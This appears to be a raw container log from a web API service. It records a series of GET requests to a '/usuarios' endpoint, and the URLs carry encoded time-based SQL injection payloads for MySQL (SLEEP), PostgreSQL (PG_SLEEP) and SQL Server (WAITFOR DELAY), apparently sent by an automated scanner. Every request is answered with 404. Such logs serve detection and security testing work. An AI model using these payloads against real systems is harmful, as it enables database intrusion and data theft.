api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:45780 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1610/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29EXST%29/%2A%2A/AND/%2A%2A/%28%27udQD%27%3D%27udQD HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45782 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1610/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29EXST%29/%2A%2A/AND/%2A%2A/%27FRtq%27%3D%27FRtq HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45784 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1610/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29EXST%29--/%2A%2A/hShB HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45786 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/1182%3D%28SELECT/%2A%2A/1182/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%288553%3D8553 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45788 - "GET /usuarios/%2A%2A/AND/%2A%2A/1182%3D%28SELECT/%2A%2A/1182/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45798 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/1182%3D%28SELECT/%2A%2A/1182/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27XycL%27%3D%27XycL HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45802 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/1182%3D%28SELECT/%2A%2A/1182/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27MSpU%27%3D%27MSpU HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45816 - "GET /usuarios/%2A%2A/AND/%2A%2A/1182%3D%28SELECT/%2A%2A/1182/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/QsrE HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45828 - "GET /usuarios%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%287393%3D7393 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45838 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45846 - "GET /usuarios%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27HcHg%27%3D%27HcHg HTTP/1.1" 404 Not Found
